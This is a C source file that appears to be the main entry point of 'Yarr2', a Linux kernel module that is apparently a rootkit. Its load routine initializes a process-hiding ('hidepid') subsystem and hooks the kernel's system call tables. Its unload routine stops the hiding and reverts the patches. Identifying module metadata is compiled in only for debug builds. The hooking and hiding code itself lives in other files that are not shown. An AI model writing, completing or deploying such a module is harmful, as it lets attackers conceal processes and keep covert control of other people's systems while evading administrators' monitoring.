#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

#include "log.h"
#include "hook.h"
#include "patch.h"
#include "hidepid.h"

#ifdef DEBUG
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ole");
MODULE_DESCRIPTION("Yarr2 module");
MODULE_VERSION("0.01");
#endif

// TODO: When some subsystem fails initializing we should free resources from
// previously initialized subsystems.
static int __init yarr2_init(void) {
    int err;

    yarr_log("Loading yarr2 into kernel...");

    yarr_log("Initializing hidepid subsystem...");
    err = init_hidepid();
    if (err) {
        yarr_log("Errors!");
        return -1;
    }

    yarr_log("Initializing syscall tables hooking subsystem...");
    err = hook_syscall_tables();
    if (err) {
        yarr_log("Errors!");
        return -1;
    }

    yarr_log("Yarr2 loading finished.");
    return 0;
}

static void __exit yarr2_exit(void) {
    int err;

    yarr_log("Starting unload of yarr2...");

    yarr_log("Stopping hidepid subsystem...");
    err = stop_hidepid();
    if (err) {
        yarr_log("Errors!");
    }

    // TODO: I don't fully like this approach (coupling between subsystems).
    // main.c doesn't call patch(), so it shouldn't be calling unpatch_all().
    // Each subsystem unpatching what they did is the correct way. However
    // calling a single time unpatch_all() reduces code complexity.
    yarr_log("Undoing patches...");
    err = unpatch_all();
    if (err) {
        yarr_log("Errors!");
    }

    yarr_log("Yarr2 unload finished");
}

module_init(yarr2_init);
module_exit(yarr2_exit);

